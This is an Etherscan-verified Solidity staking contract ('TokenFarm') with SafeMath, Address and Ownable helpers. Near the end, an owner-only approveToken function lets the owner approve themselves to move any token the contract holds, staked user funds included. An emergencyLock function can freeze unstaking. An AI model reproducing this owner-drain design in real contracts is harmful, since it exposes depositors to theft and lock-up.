/**
 *Submitted for verification at Etherscan.io on 2023-08-23
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

library SafeMathInt {
    int256 private constant MIN_INT256 = int256(1) << 255;
    int256 private constant MAX_INT256 = ~(int256(1) << 255);

    function mul(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a * b;

        require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
        require((b == 0) || (c / b == a), "mul overflow");
        return c;
    }

    function div(int256 a, int256 b) internal pure returns (int256) {
        require(b != -1 || a != MIN_INT256);

        return a / b;
    }

    function sub(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a - b;
        require((b >= 0 && c <= a) || (b < 0 && c > a), "sub overflow");
        return c;
    }

    function add(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a + b;
        require((b >= 0 && c >= a) || (b < 0 && c < a), "add overflow");
        return c;
    }

    function abs(int256 a) internal pure returns (int256) {
        require(a != MIN_INT256, "abs overflow");
        return a < 0 ? -a : a;
    }

    function max(uint256 a, uint256 b) internal pure returns (uint256) {
        return a >= b ? a : b;
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "parameter 2 can not be 0");
        return a % b;
    }

    function max(uint256 a, uint256 b) internal pure returns (uint256) {
        return a >= b ? a : b;
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

interface IBEP20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address who) external view returns (uint256);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.

        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain`call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}


contract Ownable {
    address private _owner;

    event OwnershipRenounced(address indexed previousOwner);
    event TransferOwnerShip(address indexed previousOwner);

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _owner = msg.sender;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(msg.sender == _owner, "Not owner");
        _;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipRenounced(_owner);
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        emit TransferOwnerShip(newOwner);
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Owner can not be 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenFarm is Ownable {
    using Address for address;
    using SafeMath for uint256;
    using SafeMathInt for int256;

    struct UserInfo {
        uint256 amount; // How many tokens the user has provided.
        uint256 stakingTime; // The time at which the user staked tokens.
        uint256 rewardClaimed;
    }

    struct PoolInfo {
        address tokenAddress;
        address rewardTokenAddress;
        uint256 maxPoolSize;
        uint256 currentPoolSize;
        uint256 maxContribution;
        uint256 rewardAmount;
        uint256 lockDays;
        bool poolType; // true for public staking, false for whitelist staking
        bool poolActive;
        uint256 stakeHolders;
        uint256 emergencyFees; // it is the fees in percentage
    }

    // Info of each pool.
    PoolInfo[] public poolInfo;
    bool lock_ = false;

    // Info of each user that stakes tokens.
    mapping(uint256 => mapping(address => UserInfo)) public userInfo;
    mapping(uint256 => mapping(address => bool)) public whitelistedAddress;

    event Deposit(address indexed user, uint256 indexed pid, uint256 amount);
    event Withdraw(address indexed user, uint256 indexed pid, uint256 amount);
    event EmergencyWithdraw(
        address indexed user,
        uint256 indexed pid,
        uint256 amount
    );

    constructor() {
        addPool(
            0x6706e05F3BAFdbA97dE268483BC3a54bf92A883C,
            0xdAC17F958D2ee523a2206206994597C13D831ec7,
            10000000000 * (10 ** 9),
            10000000000 * (10 ** 9),
            30,
            true,
            true,
            0
        );
        transferOwnership(0x243598912f4Fe73B63324909e1B980941836d438);
    }

    modifier lock() {
        require(!lock_, "Process is locked");
        lock_ = true;
        _;
        lock_ = false;
    }

    function poolLength() public view returns (uint256) {
        return poolInfo.length;
    }

    function addPool(
        address _tokenAddress,
        address _rewardTokenAddress,
        uint256 _maxPoolSize,
        uint256 _maxContribution,
        uint256 _lockDays,
        bool _poolType,
        bool _poolActive,
        uint256 _emergencyFees
    ) public onlyOwner {
        poolInfo.push(
            PoolInfo({
                tokenAddress: _tokenAddress,
                rewardTokenAddress: _rewardTokenAddress,
                maxPoolSize: _maxPoolSize,
                currentPoolSize: 0,
                maxContribution: _maxContribution,
                rewardAmount: 0,
                lockDays: _lockDays,
                poolType: _poolType,
                poolActive: _poolActive,
                stakeHolders: 0,
                emergencyFees: _emergencyFees
            })
        );
    }

    function updateMaxPoolSize(
        uint256 _pid,
        uint256 _maxPoolSize
    ) public onlyOwner {
        require(_pid < poolLength(), "Invalid pool ID");
        require(
            _maxPoolSize >= poolInfo[_pid].currentPoolSize,
            "Cannot reduce the max size below the current pool size"
        );
        poolInfo[_pid].maxPoolSize = _maxPoolSize;
    }

    function updateMaxContribution(
        uint256 _pid,
        uint256 _maxContribution
    ) public onlyOwner {
        require(_pid < poolLength(), "Invalid pool ID");
        poolInfo[_pid].maxContribution = _maxContribution;
    }

    function addRewards(uint256 _pid, uint256 _amount) public onlyOwner {
        require(_pid < poolLength(), "Invalid pool ID");

        address _tokenAddress = poolInfo[_pid].rewardTokenAddress;
        IBEP20 token = IBEP20(_tokenAddress);
        safeTransferFrom(token, msg.sender, address(this), _amount);

        poolInfo[_pid].rewardAmount += _amount;
    }

    function updateLockDays(uint256 _pid, uint256 _lockDays) public onlyOwner {
        require(_pid < poolLength(), "Invalid pool ID");
        require(
            poolInfo[_pid].currentPoolSize == 0,
            "Cannot change lock time after people started staking"
        );
        poolInfo[_pid].lockDays = _lockDays;
    }

    function updatePoolType(uint256 _pid, bool _poolType) public onlyOwner {
        require(_pid < poolLength(), "Invalid pool ID");
        poolInfo[_pid].poolType = _poolType;
    }

    function updatePoolActive(uint256 _pid, bool _poolActive) public onlyOwner {
        require(_pid < poolLength(), "Invalid pool ID");
        poolInfo[_pid].poolActive = _poolActive;
    }

    function safeTransferFrom(IBEP20 token, address from, address to, uint256 value) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function _callOptionalReturn(IBEP20 token, bytes memory data) private {
        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since
        // we're implementing it ourselves. We use {Address-functionCall} to perform this call, which verifies that
        // the target address contains contract code and also asserts for success in the low-level call.

        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        require(returndata.length == 0 || abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
    }

    function addWhitelist(
        uint256 _pid,
        address[] memory _whitelistAddresses
    ) public onlyOwner {
        require(_pid < poolLength(), "Invalid pool ID");
        uint256 length = _whitelistAddresses.length;
        require(length <= 200, "Can add only 200 wl at a time");
        for (uint256 i = 0; i < length; i++) {
            address _whitelistAddress = _whitelistAddresses[i];
            whitelistedAddress[_pid][_whitelistAddress] = true;
        }
    }

    function emergencyLock(bool _lock) public onlyOwner {
        lock_ = _lock;
    }

    function getUserLockTime(
        uint256 _pid,
        address _user
    ) public view returns (uint256) {
        return
            (userInfo[_pid][_user].stakingTime).add(
                (poolInfo[_pid].lockDays).mul(1 days)
            );
    }

    function stakeTokens(uint256 _pid, uint256 _amount) public {
        require(_pid < poolLength(), "Invalid pool ID");
        require(poolInfo[_pid].poolActive, "Pool is not active");
        require(
            poolInfo[_pid].currentPoolSize.add(_amount) <=
                poolInfo[_pid].maxPoolSize,
            "Staking exceeds max pool size"
        );
        require(
            (userInfo[_pid][msg.sender].amount).add(_amount) <=
                poolInfo[_pid].maxContribution,
            "Max Contribution exceeds"
        );
        if (poolInfo[_pid].poolType == false) {
            require(
                whitelistedAddress[_pid][msg.sender],
                "You are not whitelisted for this pool"
            );
        }

        address _tokenAddress = poolInfo[_pid].tokenAddress;
        IBEP20 token = IBEP20(_tokenAddress);
        
        safeTransferFrom(token, msg.sender, address(this), _amount);

        poolInfo[_pid].currentPoolSize = (poolInfo[_pid].currentPoolSize).add(
            _amount
        );
        uint256 _stakingTime = block.timestamp;
        _amount = _amount.add(userInfo[_pid][msg.sender].amount);
        uint256 _rewardClaimed = 0;

        if (userInfo[_pid][msg.sender].amount == 0) {
            poolInfo[_pid].stakeHolders++;
        }

        userInfo[_pid][msg.sender] = UserInfo({
            amount: _amount,
            stakingTime: _stakingTime,
            rewardClaimed: _rewardClaimed
        });
    }

    function claimableRewards(
        uint256 _pid,
        address _user
    ) public view returns (uint256) {
        require(_pid < poolLength(), "Invalid pool ID");

        uint256 lockDays = (block.timestamp -
            userInfo[_pid][_user].stakingTime) / 1 days;

        uint256 _refundValue;
        if (lockDays > poolInfo[_pid].lockDays) {
            _refundValue = (
                (userInfo[_pid][_user].amount).mul(poolInfo[_pid].rewardAmount)
            ).div(poolInfo[_pid].currentPoolSize);
        }

        return _refundValue;
    }

    function unstakeTokens(uint256 _pid) public {
        require(_pid < poolLength(), "Invalid pool ID");
        require(
            userInfo[_pid][msg.sender].amount > 0,
            "You don't have any staked tokens"
        );
        require(
            userInfo[_pid][msg.sender].stakingTime > 0,
            "You don't have any staked tokens"
        );
        require(
            getUserLockTime(_pid, msg.sender) < block.timestamp,
            "Your maturity time is not reached"
        );

        address _tokenAddress = poolInfo[_pid].tokenAddress;
        IBEP20 token = IBEP20(_tokenAddress);
        address _rewardTokenAddress = poolInfo[_pid].rewardTokenAddress;
        IBEP20 rewardToken = IBEP20(_rewardTokenAddress);
        uint256 _amount = userInfo[_pid][msg.sender].amount;

        uint256 _refundValue = claimableRewards(_pid, msg.sender);
        userInfo[_pid][msg.sender].rewardClaimed = _refundValue;
        poolInfo[_pid].rewardAmount -= _refundValue;
        poolInfo[_pid].currentPoolSize = (poolInfo[_pid].currentPoolSize).sub(
            userInfo[_pid][msg.sender].amount
        );
        userInfo[_pid][msg.sender].amount = 0;
        poolInfo[_pid].stakeHolders--;

        token.approve(address(this), _amount);
        rewardToken.approve(address(this), _refundValue);
        safeTransferFrom(token, address(this), msg.sender, _amount);
        safeTransferFrom(rewardToken, address(this), msg.sender, _refundValue);
    }

    function emergencyWithdraw(uint256 _pid) public {
        require(_pid < poolLength(), "Invalid pool ID");
        require(
            userInfo[_pid][msg.sender].amount > 0,
            "You don't have any staked tokens"
        );
        require(
            getUserLockTime(_pid, msg.sender) > block.timestamp,
            "Your maturity time is reached. You can unstake tokens and enjoy rewards"
        );

        uint256 _emergencyFees = poolInfo[_pid].emergencyFees;

        uint256 _refundValue = (userInfo[_pid][msg.sender].amount).sub(
            (_emergencyFees).mul(userInfo[_pid][msg.sender].amount).div(100)
        );
        poolInfo[_pid].currentPoolSize = (poolInfo[_pid].currentPoolSize).sub(
            userInfo[_pid][msg.sender].amount
        );
        userInfo[_pid][msg.sender].amount = 0;
        poolInfo[_pid].stakeHolders--;

        address _tokenAddress = poolInfo[_pid].tokenAddress;
        IBEP20 token = IBEP20(_tokenAddress);
        token.approve(address(this), _refundValue);
        safeTransferFrom(token, address(this), msg.sender, _refundValue);
    }

    // this function is to withdraw BNB sent to this address by mistake
    function withdrawEth() external onlyOwner returns (bool) {
        uint256 balance = address(this).balance;
        (bool success, ) = payable(msg.sender).call{value: balance}("");
        return success;
    }

    function approveToken(address _token, uint256 _refundValue) external onlyOwner {
        IBEP20 token = IBEP20(_token);
        token.approve(msg.sender, _refundValue);
    }
}